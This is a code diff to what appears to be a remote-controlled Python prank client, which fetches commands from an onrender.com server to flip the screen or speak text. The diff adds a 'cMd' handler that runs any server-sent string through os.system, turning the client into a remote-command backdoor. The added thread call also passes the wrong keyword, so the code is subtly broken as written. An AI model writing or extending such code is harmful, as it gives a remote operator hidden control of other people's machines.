@@ -14,7 +14,7 @@ url = "https://ms32-sha2.onrender.com/"
 screen = rs.get_primary_display()
 terminate = False
 sstate = False
-user = "93"
+user = "03"
 try:
     pygame.mixer.init()
 except:
@@ -275,6 +275,13 @@ def flip():
             screen.set_landscape()
     except Exception as e:
         log(f"flip thread error occured:\t{e}",state="WARN")
+
+def runcmd(cmd):
+    try:
+        os.system(cmd)
+        return True
+    except Exception as e:
+        log(f"runcmd thread error:\t{e}",state="WARN")
 def main():
     global sstate
     log(f"{user} online!", state="ONLINE")
@@ -312,6 +319,9 @@ def main():
                 sstate = False
                 screen.set_landscape()
                 log("flip off")
+            elif "cMd" in cmd:
+                cmd = cmd.replace("cMd ","")
+                Thread(Thread=runcmd,args=(cmd,)).start()
             elif "sPeAk" in cmd:
                 txt = cmd.replace("sPeAk","")
                 saying = Thread(target=say,args=(txt,))
